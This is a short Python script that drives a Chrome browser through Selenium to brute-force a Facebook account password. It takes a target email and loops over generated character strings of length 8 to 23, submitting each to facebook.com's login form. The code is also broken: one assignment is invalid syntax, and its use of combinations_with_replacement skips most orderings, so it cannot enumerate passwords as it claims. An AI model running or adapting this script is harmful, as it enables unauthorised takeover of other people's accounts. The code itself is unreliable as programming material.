from selenium import webdriver
from time import sleep
import string
from itertools import combinations_with_replacement



def get_usr():
    usr = input('Enter Email Id:')
    susr=usr.split("@")
    name=susr[0]

    return usr,name



def attempt_Pwd(usr,pwd,name):
    driver = webdriver.Chrome()
    driver.get('https://www.facebook.com/')
    sleep(1)
    username_box = driver.find_element_by_id('email')
    username_box.send_keys(usr)
    sleep(1)
    password_box = driver.find_element_by_id('pass')
    password_box.send_keys(pwd)

    login_box = driver.find_element_by_id('loginbutton')
    login_box.click()
    sleep(1)
    if driver.current_url!= f'https://www.facebook.com/{name}':
        driver.quit()
    else:
        exit()

def pwd_Loop(usr,name):
    chars=list(string.ascii_letters + string.punctuation + string.digits)
    for x in range (8,24):
        for i in combinations_with_replacement(chars,x):
            pwd=*i,sep=""
            attempt_Pwd(usr,pwd,name)

if __name__ == '__main__':
    usr,name=get_usr()
    pwd_Loop(usr,name)


